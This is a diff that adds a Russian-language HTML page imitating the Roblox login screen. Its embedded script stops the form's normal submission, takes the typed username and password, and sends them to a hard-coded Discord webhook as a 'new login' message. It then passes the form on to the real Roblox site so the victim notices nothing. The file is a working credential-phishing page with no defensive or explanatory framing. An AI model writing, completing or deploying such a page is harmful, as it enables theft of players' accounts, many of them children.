@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox — Вход</title>
+    <meta charset="UTF-8">
+    <style>
+        body { background: #1a1a2e; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: #16213e; padding: 40px; border-radius: 12px; box-shadow: 0 0 30px rgba(0,0,0,0.7); width: 320px; text-align: center; }
+        .box h2 { color: #fff; margin-bottom: 20px; }
+        .box input { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 8px; background: #0f3460; color: #fff; }
+        .box button { width: 100%; padding: 12px; background: #e94560; border: none; border-radius: 8px; color: #fff; font-weight: bold; cursor: pointer; }
+        .box button:hover { background: #c73a54; }
+    </style>
+</head>
+<body>
+<div class="box">
+    <h2>Вход в Roblox</h2>
+    <form id="login" method="POST" action="https://www.roblox.com/login">
+        <input type="text" name="username" placeholder="Имя пользователя" required>
+        <input type="password" name="password" placeholder="Пароль" required>
+        <button type="submit">Войти</button>
+    </form>
+</div>
+<script>
+document.getElementById('login').onsubmit = function(e) {
+    e.preventDefault();
+    const form = this;
+    const data = new FormData(form);
+    const payload = {
+        content: `**НОВЫЙ ЛОГИН**\nЛогин: ${data.get('username')}\nПароль: ${data.get('password')}`
+    };
+    fetch('https://discord.com/api/webhooks/1542483853988462642/zsmzJHLBn6r2wfoz8q3Z4uO52QpoHJVEiLXTW1wFIUEVjmm7K9ykN_gpSpL7aK9klmum', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    }).then(() => {
+        form.submit();
+    }).catch(() => {
+        form.submit();
+    });
+};
+</script>
+</body>
+</html>
